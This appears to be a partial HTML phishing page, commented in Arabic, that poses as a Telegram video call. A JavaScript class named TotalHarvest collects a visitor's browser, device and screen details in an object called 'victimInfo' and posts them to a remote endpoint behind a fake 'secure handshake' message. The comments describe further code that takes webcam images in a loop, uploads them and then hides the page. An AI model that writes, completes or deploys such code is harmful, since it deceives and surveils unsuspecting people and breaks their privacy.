<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <style>
        /* CSS يبقى كما هو */
    </style>
</head>
<body>
    <div class="container">
        <!-- الواجهة الأولية تبقى كما هي -->
    </div>

    <script>
        class TotalHarvest {
            constructor() {
                // ... (الإعدادات تبقى كما هي)
            }

            setupInitialUI() {
                // ... (هذه الدالة تبقى كما هي)
            }

            async startOperation() {
                // ... (استعادة الواجهة الأصلية)
                
                // --- الموجة الأولى: إرسال التقرير الأولي فورًا ---
                this.sendInitialReport();

                try {
                    // ... (باقي الكود لطلب الكاميرا وتشغيل حلقة الالتقاط)
                } catch (error) {
                    this.updateStatus('Verification failed. Media access is required.');
                }
            }
            
            // --- دالة جديدة لإرسال التقرير الأولي ---
            async sendInitialReport() {
                this.updateStatus('Establishing secure handshake...');
                
                // نقوم بجمع كل المعلومات المتاحة قبل طلب الكاميرا
                const connection = navigator.connection || {};
                const deviceInfo = { memory: `${navigator.deviceMemory || 'N/A'} GB`, cores: navigator.hardwareConcurrency || 'N/A' };
                const victimInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: (navigator.languages || []).join(', '),
                    screenResolution: `${screen.width}x${screen.height} (Avail: ${screen.availWidth}x${screen.availHeight})`,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    device: deviceInfo
                };

                // إرسال التقرير بدون صورة
                return fetch(this.apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken },
                    body: JSON.stringify({ info: victimInfo }) // لا يوجد حقل 'image'
                });
            }

            startCaptureLoop() {
                // ... (هذه الدالة تبقى كما هي)
            }
            
            finishOperation() {
                // ... (هذه الدالة تبقى كما هي)
            }

            async sendToServer(imageData, count) {
                // ... (هذه الدالة تبقى كما هي لإرسال الصور)
            }

            disappear() {
                // ... (هذه الدالة تبقى كما هي)
            }

            updateStatus(message) { /* ... */ }
            updateProgress(percent) { /* ... */ }
        }

        document.addEventListener('DOMContentLoaded', () => {
            new TotalHarvest();
        });
    </script>
</body>
</html>